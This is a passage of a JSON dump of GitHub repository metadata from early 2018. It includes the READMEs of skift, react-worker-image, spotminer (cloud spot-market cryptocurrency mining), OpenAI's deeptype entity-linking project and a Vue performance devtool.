components","subscribersCount":{"totalCount":4},"diskUsage":40,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":1},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":2},"commits":{"totalCount":90}}}]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":6},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":1}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"shaypal5","followers":{"totalCount":31},"repositories":{"totalCount":54},"following":{"totalCount":12},"location":"Israel","organizations":{"totalCount":2},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":4},"websiteUrl":"https://shaypal5.github.io/"},"repository":{"name":"skift","primaryLanguage":{"name":"Python"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":6,"readme_md":null,"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":121},"createdAt":"2018-02-03T11:37:21Z","updatedAt":"2018-02-15T01:43:25Z","pushedAt":"2018-02-13T23:37:29Z","description":"scikit-learn wrappers for Python fastText.","subscribersCount":{"totalCount":6},"diskUsage":65,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":25}}},"tags":{"totalCount":6},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"nitish24p","followers":{"totalCount":7},"repositories":{"totalCount":25},"following":{"totalCount":1},"location":"Mumbai","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":9},"websiteUrl":""},"repository":{"name":"react-worker-image","primaryLanguage":{"name":"JavaScript"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":9,"readme_md":{"text":"# react-worker-image\n[![Build Status](https://travis-ci.org/nitish24p/react-worker-image.svg?branch=master)](https://travis-ci.org/nitish24p/react-worker-image)\nReact component to fetch image resources via web workers\n\n[react-worker-image](https://www.npmjs.com/package/react-worker-image) is a React component for loading images via a web worker. Thereby not blocking the main thread and speeding up page load time.\n\n## Installation\nUsing npm\n\n```bash\nnpm install react-worker-image\n\nyarn add react-worker-image\n```\n\n## Usage\n\n`react-worker-image` exports one react component which takes `src` as a prop, and an optional prop of `placeholder`, `style` and `imageClass` which are applied to the img tag.\n\n```js\nconst ImageWorker = require('react-worker-image').default;\n\nor\n\nimport ImageWorker from 'react-worker-image';\n\n```\nusage in code\n```jsx\n<ImageWorker src='http://image-url' />\n```\n\n## Props List\n\n\n| Prop type        | Required           | type  |\n| ------------- |:-------------:| --------------:|\n| src      | yes |  string |\n| placeholder      | optional      |   string or Component|\n| style | optional     |    Object |\n|imageClass | optional | string\n|containerClass | optional | string\n\nThe above props are applied to the img tag.\n\nFound a bug file them [here](https://github.com/nitish24p/react-worker-image/issues).\n\n>Component in Action\n\nObserve the page Load time at the bottom right corner in both cases.\n\nThe first is via a webworker and the second is the regular get.\n\n<img src=\"./screen/screen.gif\">\n\n","byteSize":1525},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":136},"createdAt":"2018-02-03T13:44:22Z","updatedAt":"2018-02-17T03:32:09Z","pushedAt":"2018-02-17T05:04:06Z","description":"React component to fetch image resources via web workers 🤖🤖","subscribersCount":{"totalCount":4},"diskUsage":1866,"pullRequestsOpen":{"totalCount":4},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":3},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":4},"commits":{"totalCount":5}}},{"node":{"comments":{"totalCount":5},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":5},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":9}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":3}}}]},"issuesOpen":{"totalCount":8},"issuesClosed":{"totalCount":3},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":9},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}}]},"numBranches":{"totalCount":3},"numCommits":{"target":{"history":{"totalCount":53}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"alexellis","followers":{"totalCount":884},"repositories":{"totalCount":207},"following":{"totalCount":8},"location":"United Kingdom","organizations":{"totalCount":3},"gists":{"edges":[{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":17}}},{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":10}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":10}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":15}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":8}}},{"node":{"comments":{"totalCount":6},"stargazers":{"totalCount":8}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":5}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":24},"stargazers":{"totalCount":81}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":1},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}}],"totalCount":108},"websiteUrl":"http://alexellis.io/"},"repository":{"name":"spotminer","primaryLanguage":{"name":"Go"},"license":"MIT License","isArchived":false,"hasWikiEnabled":true,"forkCount":7,"readme_md":{"text":"spotminer\n--------------------------\n\n## What is this?\n\n`spotminer` automates the [Packet.net](https://www.packet.net) [spot market](https://help.packet.net/technical/deployment-options/spot-market) and a cryptocurrency miner so that you can lower the costs of mining in the cloud and access bare metal performance.\n\n> Packet's [Spot Market](https://help.packet.net/technical/deployment-options/spot-market) allows users to bid on spare server capacity at reduced rates. \n\nFeatures:\n\n* Set a budget (max price) for each host\n* Automatically sets the closest stratum server\n* Places the minimum bid for the host\n* Uses my [mine-with-docker project](https://github.com/alexellis/mine-with-docker) and `cpuminer`\n* Can be run on a timer - i.e. every 5 minutes to ensure reclaimed hosts are replaced\n* Easy configuration in YAML\n* Docker Swarm used as an init process to keep the miner running if it crashes\n* Configure one of the supported algorithms and Stratum of port i.e. hodl or cryptonight\n* Atom hosts are supported through a separate Docker image\n\n> Note: See disclaimer and check T&Cs with any cloud provider before embarking on mining.\n\n## Q&A\n\n* [Watch my video on why you shouldn't mine Bitcoin](https://www.youtube.com/watch?v=Apg8glATeto)\n\nIf you have additional questions or you want to try mining but don't want to use this example then consult my [mine-with-docker project](https://github.com/alexellis/mine-with-docker). You can also rebuild your own Docker image/binaries from source.\n\n## Installation\n\n* Install Go 1.9\n\n* Run go install\n\n```\ngo install github.com/alexellis/spotminer\n```\n\nThis installs spotminer into your `$GOPATH/bin` directory, so update your `$PATH` variable if necessary. `$GOPATH` is normally set to `$HOME/go`.\n\n\nThe config file is read from `config.yml`, so copy `config.example.yml` as a template and fill in your [Packet API key and project ID](https://www.packet.net/developers/api/). Set the `CONFIG_FILE` enviromental variable for a different filename or path. You must also configure the bitcoin wallet address for your mining here.\n\n```yaml\npacket:\n  project_id: \"\"\n  api_key: \"\"\npreferences:\n  max_spot_instances: 6\n  max_price: 0.15\n  mine_algo: \"cryptonight\"\n  port: 3355\n  bitcoin_wallet: wallet_address\n```\n\nFor mining Hodl use `mine_algo: hodl` and `port: 3352`\n\n## Packages:\n\nDependencies are managed through the `dep` tool.\n\n* github.com/packethost/packngo\n\nGo package used to talk to the Packet API\n\n* gopkg.in/yaml.v2 \n\nUsed to read YAML configuration files\n\n## Disclaimer\n\nThis software is provided without any warranty or support. Use at your own risk and consult the T&Cs of your cloud or hosting provider before running this software.\n","byteSize":2698},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":144},"createdAt":"2018-02-03T13:08:25Z","updatedAt":"2018-02-14T01:10:20Z","pushedAt":"2018-02-04T09:00:18Z","description":"Golang automation for mining cryptocurrencies on the Spot Market","subscribersCount":{"totalCount":11},"diskUsage":109,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":0},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[]},"issuesOpen":{"totalCount":0},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":6}}},"tags":{"totalCount":2},"releases":{"totalCount":1},"type":"user"},"siteAdmin":"false"},{"organization":{"login":"openai","repositories":{"totalCount":53},"location":null,"members":{"totalCount":0},"websiteUrl":"https://openai.com/"},"repository":{"name":"deeptype","primaryLanguage":{"name":"Python"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":18,"readme_md":{"text":"DeepType: Multilingual Entity Linking through Neural Type System Evolution\n--------------------------------------------------------------------------\n\nThis repository contains code necessary for designing, evolving type systems, and training neural type systems. To read more about this technique and our results [see this blog post](https://blog.openai.com/discovering-types-for-entity-disambiguation/) or [read the paper](https://arxiv.org/abs/1802.01021).\n\nAuthors: Jonathan Raiman & Olivier Raiman\n\nOur latest approach to learning symbolic structures from data allows us to discover a set of task specific constraints on a neural network in the form of a type system, to guide its understanding of documents, and obtain state of the art accuracy at [recognizing entities in natural language](https://en.wikipedia.org/wiki/Entity_linking). Recognizing entities in documents can be quite challenging since there are often millions of possible answers. However, when using a type system to constrain the options to only those that semantically \"type check,\" we shrink the answer set and make the problem dramatically easier to solve. Our new results suggest that learning types is a very strong signal for understanding natural language: if types were given to us by an oracle, we find that it is possible to obtain accuracies of 98.6-99% on two benchmark tasks [CoNLL (YAGO)](https://www.mpi-inf.mpg.de/departments/databases-and-information-systems/research/yago-naga/aida/) and the [TAC KBP 2010 challenge](https://pdfs.semanticscholar.org/b7fb/11ef06b0dcdc89ef0a5507c6c9ccea4206d8.pdf).\n\n### Data colllection\n\nGet wikiarticle -> wikidata mapping (all languages) + Get anchor tags, redirections, category links, statistics (per language). To store all wikidata ids, their key properties (`instance of`, `part of`, etc..), and\na mapping from all wikipedia article names to a wikidata id do as follows,\nalong with wikipedia anchor tags and links, in three languages: English (en), French (fr), and Spanish (es):\n\n```\nexport DATA_DIR=data/\n./extraction/full_preprocess.sh ${DATA_DIR} en fr es\n```\n\n### Create a type system manually and check oracle accuracy:\n\nTo build a graph projection using a set of rules inside `type_projection.py`\n(or any Python file containing a `classify` method), and a set of nodes\nthat should not be traversed in `blacklist.json`:\n\n```\nexport LANGUAGE=fr\nexport DATA_DIR=data/\npython3 extraction/project_graph.py ${DATA_DIR}wikidata/ extraction/classifiers/type_classifier.py\n```\n\nTo save a graph projection as a numpy array along with a list of classes to a\ndirectory stored in `CLASSIFICATION_DIR`:\n\n```\nexport LANGUAGE=fr\nexport DATA_DIR=data/\nexport CLASSIFICATION_DIR=data/type_classification\npython3 extraction/project_graph.py ${DATA_DIR}wikidata/ extraction/blacklist.json extraction/classifiers/type_classifier.py  --export_classification ${CLASSIFICATION_DIR}\n```\n\nTo use the saved graph projection on wikipedia data to test out how discriminative this\nclassification is (Oracle performance) (edit the config file to make changes to the classification used):\n\n```\nexport DATA_DIR=data/\npython3 extraction/evaluate_type_system.py extraction/configs/en_disambiguator_config_export_small.json --relative_to ${DATA_DIR}\n```\n\n### Obtain learnability scores for types\n\n```bash\nexport DATA_DIR=data/\npython3 extraction/produce_wikidata_tsv.py extraction/configs/en_disambiguator_config_export_small.json --relative_to ${DATA_DIR} sample_data.tsv\npython3 learning/evaluate_learnability.py sample_data.tsv --out report.json --wikidata ${DATA_DIR}wikidata/\n```\n\nSee `learning/LearnabilityStudy.ipynb` for a visual analysis of the AUC scores.\n\n### Evolve a type system\n\n```bash\npython3 extraction/evolve_type_system.py extraction/configs/en_disambiguator_config_export_small.json --relative_to ${DATA_DIR}  --method cem  --penalty 0.00007\n```\nMethod can be `cem`, `greedy`, `beam`, or `ga`, and penalty is the soft constraint on the size of the type system (lambda in the paper).\n\n#### Convert a type system solution into a trainable type classifier\n\nThe output of `evolve_type_system.py` is a set of types (root + relation) that can be used to build a type system. To create a config file that can be used to train an LSTM use the jupyter notebook `extraction/TypeSystemToNeuralTypeSystem.ipynb`.\n\n### Train a type classifier using a type system\n\nFor each language create a training file:\n\n```\nexport LANGUAGE=en\npython3 extraction/produce_wikidata_tsv.py extraction/configs/${LANGUAGE}_disambiguator_config_export.json /Volumes/Samsung_T3/tahiti/2017-12/${LANGUAGE}_train.tsv  --relative_to /Volumes/Samsung_T3/tahiti/2017-12/\n```\n\nThen create an H5 file from each language containing the mapping from tokens to their entity ids in Wikidata:\n\n```\nexport LANGUAGE=en\npython3 extraction/produce_windowed_h5_tsv.py  /Volumes/Samsung_T3/tahiti/2017-12/${LANGUAGE}_train.tsv /Volumes/Samsung_T3/tahiti/2017-12/${LANGUAGE}_train.h5 /Volumes/Samsung_T3/tahiti/2017-12/${LANGUAGE}_dev.h5 --window_size 10  --validation_start 1000000 --total_size 200500000\n```\n\nCreate a training config with all languages, `my_config.json`. Paths to the datasets is relative to config file (e.g. you can place it in the same directory as the dataset h5 files):\n[Note: set `wikidata_path` to where you extracted wikidata information, and `classification_path` to where you exported the classifications with `project_graph.py`]. See learning/configs for a pre written config covering English, French, Spanish, German, and Portuguese.\n\n```\n{\n    \"datasets\": [\n        {\n            \"type\": \"train\",\n            \"path\": \"en_train.h5\",\n            \"x\": 0,\n            \"ignore\": \"other\",\n            \"y\": [\n                {\n                    \"column\": 1,\n                    \"objective\": \"type\",\n                    \"classification\": \"type_classification\"\n                },...\n            ],\n            \"ignore\": \"other\",\n            \"comment\": \"#//#\"\n        },\n        {\n            \"type\": \"dev\",\n            \"path\": \"en_dev.h5\",\n            \"x\": 0,\n            \"ignore\": \"other\",\n            \"y\": [\n                {\n                    \"column\": 1,\n                    \"objective\": \"type\",\n                    \"classification\": \"type_classification\"\n                },...\n            ],\n            \"ignore\": \"other\",\n            \"comment\": \"#//#\"\n        }, ...\n    ],\n    \"features\": [\n        {\n            \"type\": \"word\",\n            \"dimension\": 200,\n            \"max_vocab\": 1000000\n        },...\n    ],\n    \"objectives\": [\n        {\n            \"name\": \"type\",\n            \"type\": \"softmax\",\n            \"vocab\": \"type_classes.txt\"\n        }, ...\n    ],\n    \"wikidata_path\": \"wikidata\",\n    \"classification_path\": \"classifications\"\n}\n```\n\nLaunch training on a single gpu:\n\n```\nCUDA_VISIBLE_DEVICES=0 python3 learning/train_type.py my_config.json --cudnn --fused --hidden_sizes 200 200 --batch_size 256 --max_epochs 10000  --name TypeClassifier --weight_noise 1e-6  --save_dir my_great_model  --anneal_rate 0.9999\n```\n\nSeveral key parameters:\n\n- `name`: main scope for model variables, avoids name clashing when multiple classifiers are loaded\n- `batch_size`: how many examples are used for training simultaneously, can cause out of memory issues\n- `max_epochs`: length of training before auto-stopping. In practice this number should be larger than needed.\n- `fused`: glue all output layers into one, and do a single matrix multiply (recommended).\n- `hidden_sizes`: how many stacks of LSTMs are used, and their sizes (here 2, each with 200 dimensions).\n- `cudnn`: use faster CuDNN kernels for training\n- `anneal_rate`: shrink the learning rate by this amount every 33000 training steps\n- `weight_noise`: sprinkle Gaussian noise with this standard deviation on the weights of the LSTM (regularizer, recommended).\n\n\n#### To test that training works:\n\nYou can test that training works as expected using the dummy training set containing a Part of Speech CRF objective and cat vs dogs log likelihood objective is contained under learning/test:\n\n```bash\npython3 learning/train_type.py learning/test/config.json\n```\n\n### Installation\n\n#### Mac OSX\n\n```\npip3 install -r requirements.txt\npip3 install wikidata_linker_utils_src/\n```\n\n#### Fedora 25\n\n```\nsudo dnf install redhat-rpm-config\nsudo dnf install gcc-c++\nsudo pip3 install marisa-trie==0.7.2\nsudo pip3 install -r requirements.txt\npip3 install wikidata_linker_utils_src/\n```\n","byteSize":8439},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":176},"createdAt":"2018-02-03T19:48:28Z","updatedAt":"2018-02-16T15:54:30Z","pushedAt":"2018-02-13T21:34:45Z","description":"Design, evolve, and train neural type systems.","subscribersCount":{"totalCount":12},"diskUsage":348,"pullRequestsOpen":{"totalCount":1},"pullRequestsClosed":{"totalCount":2},"pullRequestsMerged":{"totalCount":2},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":8}}}]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":3},"issuesClosed":{"totalCount":7},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":13}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"organization":{"login":"vue-perf-devtool","repositories":{"totalCount":1},"location":null,"members":{"totalCount":1},"websiteUrl":""},"repository":{"name":"vue-perf-devtool","primaryLanguage":{"name":"JavaScript"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":3,"readme_md":{"text":"# Vue Performance Devtool\n\nVue Performance Devtool is a browser extension for inspecting the performance of Vue Components. It statistically examines the performance of Vue components based on the measures which are collected by Vue using `window.performance` API.\n\n<p align=\"center\"><img src=\"https://raw.githubusercontent.com/vue-perf-devtool/vue-perf-devtool/master/media/logo.png\" alt=\"logo\"></p>\n\nInitially started after reading [React Performance Devtool](https://github.com/nitin42/react-perf-devtool#using-the-browser-extension) and created from [Vue Devtool](https://github.com/vuejs/vue-devtools).\n\n## Installation\n\nThe below extensions represent the current stable release.\n\n- [Chrome extension](https://chrome.google.com/webstore/detail/vue-performance-devtool/koljilikekcjfeecjefimopfffhkjbne)\n- [Firefox extension](https://addons.mozilla.org/en-US/firefox/addon/vue-performance-devtool/)\n\n## Implementation\n\nTo use this performance devtool extension, you'll need to allow [vue-devtools inspection](https://vuejs.org/v2/api/#devtools) and [performance](https://vuejs.org/v2/api/#performance)\n\n```js\n// make sure to set this synchronously immediately after loading Vue and before `new Vue`\nVue.config.devtools = true\nVue.config.performance = true\n```\n\n**Note**: if you keep `Vue.config.performance = true` on production, you will also be able to use Vue official devtools in the production build. If you don't want that, you can toggle the config to false by using an environment variable:\n\n```js\nVue.config.performance = process.env.NODE_ENV !== 'production'\n```\n\n## Uses\n\n- Remove or unmount the component instances which are not being used.\n- Inspect what is blocking or taking more time after an operation has been started.\n- Examine which components are taking more time to load.\n\n## Description\n\n<p align=\"center\"><img width=\"600px\" src=\"https://raw.githubusercontent.com/vue-perf-devtool/vue-perf-devtool/master/media/background2.png\" alt=\"demo\"></p>\n\n- **Init:** Time taken in \"beforeCreated\" and \"created\" of lifecycle.\n- **Render:** Time taken to create the instance in javascript.\n- **Patch:** Time taken to render in dom.\n\n## Acknowledgments\nSpecial thanks to [Evan You](https://github.com/yyx990803) and [vue-devtool contributors](https://github.com/vuejs/vue-devtools/graphs/contributors)\n\n### License\n\n[MIT](http://opensource.org/licenses/MIT)\n","byteSize":2371},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":239},"createdAt":"2018-02-03T22:49:28Z","updatedAt":"2018-02-16T16:02:24Z","pushedAt":"2018-02-08T12:11:27Z","description":"Vue Performance Devtool is a browser extension for inspecting the performance of Vue 